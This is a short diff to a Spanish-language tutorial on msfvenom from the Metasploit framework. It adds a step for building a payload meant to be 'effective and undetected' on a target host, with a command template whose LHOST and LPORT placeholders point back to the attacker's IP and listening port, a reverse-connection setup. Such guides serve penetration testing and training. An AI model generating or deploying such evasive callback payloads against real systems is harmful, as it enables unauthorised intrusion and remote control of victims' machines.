@@ -42,5 +42,12 @@ msfvenom -l payloads
 # Listado de opciones para payloads
 msfvenom -p [payload_elegido] --list-options
 ```
+</b>
 
+- <b>Paso 3</b>: Se crea el payload con los parámetros necesarios para que sea efectivo y no detectado en el host objetivo:
+<b>
+
+```
+msfvenom -p [payload_elegido] LHOST=[ip_atacante] LPORT=[puerto_escucha_atacante]
+```
 </b>
